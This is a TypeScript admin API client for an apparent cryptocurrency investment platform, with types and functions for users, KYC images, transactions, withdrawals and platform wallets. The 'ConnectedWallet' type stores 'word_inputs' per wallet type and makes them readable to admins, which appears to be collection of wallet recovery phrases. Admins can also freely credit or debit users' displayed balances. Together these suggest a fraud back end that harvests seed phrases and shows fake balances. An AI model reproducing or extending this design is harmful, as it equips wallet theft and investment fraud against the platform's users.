import { apiRequest } from "./config";

// Types based on your MySQL schema
export interface User {
  user_id: number;
  user_name: string;
  user_email: string;
  kyc: string;
  user_phone: string;
  user_picture: string;
  user_reg_date: string;
  user_region: string;
  user_dob: string;
  user_address: string;
  us_citizen: string;
}

export interface UserBalance {
  user_id: number;
  user_name: string;
  user_balance: number;
  portfolio_growth: number;
}

export interface UserKYC {
  user_id: number;
  img_one: string;
  img_two: string;
  img_three: string;
  upload_time: string;
  user?: User;
}

export interface Transaction {
  trans_id: number;
  user_id: number;
  trans_type: string;
  crypto: string;
  trans_amt: number;
  trans_time: string;
  trans_stat: string;
  user_wallet: string;
  user?: User;
}

export interface ConnectedWallet {
  user_id: number;
  wallet_type: string;
  word_inputs: string;
  time: string;
  user_name?: string;
  user_email?: string;
}

export interface Notification {
  user_id: number;
  notification: string;
  notification_desc: string;
  notification_status: string;
  notification_time: string;
}

// Activity Log Types
export interface ActivityLog {
  log_id: number;
  action: string;
  category: "user" | "admin" | "system" | "security" | "transaction";
  actor: string;
  target: string | null;
  details: string;
  ip_address: string;
  created_at: string;
}

// System Settings Types
export interface SystemSettings {
  setting_key: string;
  setting_value: string;
  setting_group: string;
  updated_at: string;
}

// Analytics Types
export interface AnalyticsData {
  userGrowth: { month: string; users: number }[];
  revenueData: { month: string; revenue: number }[];
  transactionVolume: { day: string; volume: number }[];
  assetDistribution: { name: string; value: number; color: string }[];
  topCountries: { country: string; users: number; percentage: number }[];
  stats: {
    monthlyActiveUsers: number;
    monthlyRevenue: number;
    weeklyVolume: number;
    conversionRate: number;
    mauChange: number;
    revenueChange: number;
    volumeChange: number;
    conversionChange: number;
  };
}

// Platform Wallet Types
export interface PlatformWallet {
  wallet_id: number;
  name: string;
  symbol: string;
  balance: string;
  usd_value: number;
  address: string;
  change_24h: number;
}

export interface WalletMovement {
  movement_id: number;
  type: "in" | "out";
  asset: string;
  amount: string;
  source: string;
  created_at: string;
}

// Admin API Functions

export async function fetchAllUsers(): Promise<User[]> {
  return apiRequest<User[]>("users", { q: "admin_get_users" });
}

export async function fetchAllAdminUsers(): Promise<any[]> {
  const res = await apiRequest<{ success: boolean; data: any[] }>("users", { q: "fetch_users" });
  return res.data || [];
}

export async function fetchUserById(userId: number): Promise<User> {
  return apiRequest<User>("user", { q: "admin_get_user", user_id: userId });
}

export async function updateUserStatus(userId: number, status: string): Promise<{ success: boolean }> {
  return apiRequest<{ success: boolean }>("user", { 
    q: "admin_update_user_status", 
    user_id: userId, 
    status 
  });
}

export async function fetchUserBalances(): Promise<UserBalance[]> {
  return apiRequest<UserBalance[]>("balances", { q: "admin_get_balances" });
}

export async function updateUserBalance(
  userId: number, 
  amount: number, 
  type: "credit" | "debit",
  reason: string
): Promise<{ success: boolean }> {
  return apiRequest<{ success: boolean }>("balance", { 
    q: "admin_adjust_balance", 
    user_id: userId, 
    amount,
    type,
    reason
  });
}

export async function fetchKYCSubmissions(): Promise<any> {
  const res = await apiRequest<{ success: boolean; data: any }>("kyc", { q: "admin_get_kyc_submissions" });
  return res.data;
}

export async function fetchDetailedKYCSubmissions(): Promise<any[]> {
  const res = await apiRequest<{ success: boolean; data: any[] }>("kyc", { q: "fetch_kyc_submissions" });
  return res.data || [];
}

export async function updateKYCStatus(
  userId: number, 
  status: "verified" | "rejected"
): Promise<{ success: boolean }> {
  return apiRequest<{ success: boolean }>("kyc", { 
    q: "admin_update_kyc", 
    user_id: userId, 
    kyc_status: status 
  });
}

export async function fetchAllTransactions(): Promise<Transaction[]> {
  const res = await apiRequest<{ success: boolean; data: Transaction[] }>("transactions", { q: "admin_get_transactions" });
  return res.data || [];
}

export async function fetchWithdrawals(): Promise<Transaction[]> {
  const res = await apiRequest<{ success: boolean; data: Transaction[] }>("withdrawals", { q: "admin_get_withdrawals" });
  return res.data || [];
}

export async function fetchApprovedDeposits() {
  const res = await apiRequest<{ success: boolean; data: any }>("transactions", {
    q: "admin_get_approved_deposits"
  });
  return res.data;
}

export async function updateTransactionStatus(
  transId: number, 
  status: string
): Promise<{ success: boolean }> {
  return apiRequest<{ success: boolean }>("transaction", { 
    q: "admin_update_transaction", 
    trans_id: transId, 
    status 
  });
}

export async function fetchConnectedWallets(): Promise<ConnectedWallet[]> {
  return apiRequest<ConnectedWallet[]>("wallets", { q: "admin_get_connected_wallets" });
}

export async function fetchNotifications(): Promise<Notification[]> {
  return apiRequest<Notification[]>("notifications", { q: "admin_get_notifications" });
}

export async function sendNotification(
  userId: number | "all",
  title: string,
  message: string,
  channel: string
): Promise<{ success: boolean }> {
  return apiRequest<{ success: boolean }>("notification", { 
    q: "admin_send_notification", 
    user_id: userId,
    notification: title,
    notification_desc: message,
    channel
  });
}

export async function fetchDashboardStats(): Promise<{
  totalUsers: number;
  activeUsers: number;
  totalDeposits: number;
  totalWithdrawals: number;
  pendingKYC: number;
  pendingWithdrawals: number;
}> {
  const res = await apiRequest<{ success: boolean; data: any }>("stats", { q: "admin_dashboard_stats" });
  return res.data;
}

// Activity Logs
export async function fetchActivityLogs(): Promise<ActivityLog[]> {
  return apiRequest<ActivityLog[]>("logs", { q: "admin_get_activity_logs" });
}

export async function fetchActivityLogStats(): Promise<{
  total: number;
  user: number;
  admin: number;
  security: number;
  transaction: number;
  system: number;
}> {
  return apiRequest("logs", { q: "admin_get_activity_log_stats" });
}

// System Settings
export async function fetchSystemSettings(): Promise<SystemSettings[]> {
  const res = await apiRequest<{ success: boolean; data: SystemSettings[] }>("settings", { q: "admin_get_settings" });
  return res.data || [];
}

export async function updateSystemSettings(
  settings: Record<string, string>
): Promise<{ success: boolean }> {
  return apiRequest<{ success: boolean }>("settings", { 
    q: "admin_update_settings",
    settings
  });
}

// Analytics
export async function fetchAnalyticsData(): Promise<AnalyticsData> {
  return apiRequest<AnalyticsData>("analytics", { q: "admin_get_analytics" });
}

// Platform Wallets
export async function fetchPlatformWallets(): Promise<PlatformWallet[]> {
  return apiRequest<PlatformWallet[]>("platform_wallets", { q: "admin_get_platform_wallets" });
}

export async function fetchWalletMovements(): Promise<WalletMovement[]> {
  return apiRequest<WalletMovement[]>("wallet_movements", { q: "admin_get_wallet_movements" });
}

export async function fetchWalletBalanceHistory(): Promise<{
  date: string;
  btc: number;
  eth: number;
  usdt: number;
}[]> {
  return apiRequest("wallet_history", { q: "admin_get_wallet_balance_history" });
}
